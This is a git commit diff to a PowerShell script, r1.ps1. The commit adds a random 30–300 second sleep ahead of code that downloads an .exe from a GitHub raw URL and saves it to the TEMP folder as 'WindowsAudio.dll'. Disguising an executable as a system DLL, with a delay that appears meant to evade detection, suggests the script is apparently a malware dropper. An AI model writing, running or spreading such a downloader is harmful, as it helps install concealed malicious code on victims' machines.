bdc42c3c68d41fe45adf39bb623913edafb468db
kokisko9 <kikosi9488@gmail.com>
2025-05-29 01:28:42 +0200

    Update r1.ps1

--- r1.ps1
+++ r1.ps1
@@ -1,3 +1,4 @@
+Start-Sleep -Seconds (Get-Random -Min 30 -Max 300)
 $url = "https://github.com/kokisko9/1144/raw/main/1114.exe"
 $output = "$env:TEMP\WindowsAudio.dll"
 (New-Object Net.WebClient).DownloadFile($url, $output)
